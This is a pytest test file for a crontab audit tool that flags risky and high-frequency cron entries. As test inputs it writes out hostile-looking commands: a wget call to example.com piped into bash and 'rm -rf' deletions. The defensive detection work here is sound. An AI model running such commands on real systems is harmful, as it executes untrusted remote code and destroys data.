"""Tests for risk flagging."""

import pytest
from crontab_audit.parser import CrontabEntry
from crontab_audit.risk import flag_risky_entries, flag_high_frequency, is_high_frequency


def make_entry(schedule: str, command: str, host: str = "host1") -> CrontabEntry:
    minute, hour, dom, month, dow = schedule.split()
    return CrontabEntry(
        minute=minute, hour=hour, dom=dom, month=month, dow=dow,
        command=command, host=host, raw=f"{schedule} {command}"
    )


def test_risky_rm_rf():
    entry = make_entry("0 2 * * *", "rm -rf /tmp/cache")
    flags = flag_risky_entries([entry])
    assert len(flags) == 1
    assert "destructive" in flags[0].reason


def test_risky_wget():
    entry = make_entry("0 3 * * *", "wget http://example.com/script.sh | bash")
    flags = flag_risky_entries([entry])
    assert len(flags) == 1


def test_risky_sudo():
    entry = make_entry("30 4 * * *", "sudo /usr/bin/cleanup")
    flags = flag_risky_entries([entry])
    assert len(flags) == 1
    assert "privilege" in flags[0].reason


def test_safe_entry_no_flags():
    entry = make_entry("0 1 * * *", "/usr/local/bin/backup.sh")
    flags = flag_risky_entries([entry])
    assert flags == []


def test_risk_flag_str():
    entry = make_entry("0 2 * * *", "rm -rf /tmp")
    flags = flag_risky_entries([entry])
    result = str(flags[0])
    assert "[RISK]" in result
    assert "host1" in result


def test_high_frequency_star():
    entry = make_entry("* * * * *", "/usr/bin/check")
    assert is_high_frequency(entry) is True


def test_high_frequency_step_1():
    entry = make_entry("*/1 * * * *", "/usr/bin/check")
    assert is_high_frequency(entry) is True


def test_not_high_frequency_step_5():
    entry = make_entry("*/5 * * * *", "/usr/bin/check")
    assert is_high_frequency(entry) is False


def test_not_high_frequency_hourly():
    entry = make_entry("0 * * * *", "/usr/bin/check")
    assert is_high_frequency(entry) is False


def test_flag_high_frequency_returns_flags():
    entry = make_entry("* * * * *", "/usr/bin/poll")
    flags = flag_high_frequency([entry])
    assert len(flags) == 1
    assert "5 minutes" in flags[0].reason


def test_flag_high_frequency_empty_for_safe():
    entry = make_entry("0 6 * * *", "/usr/bin/daily")
    flags = flag_high_frequency([entry])
    assert flags == []
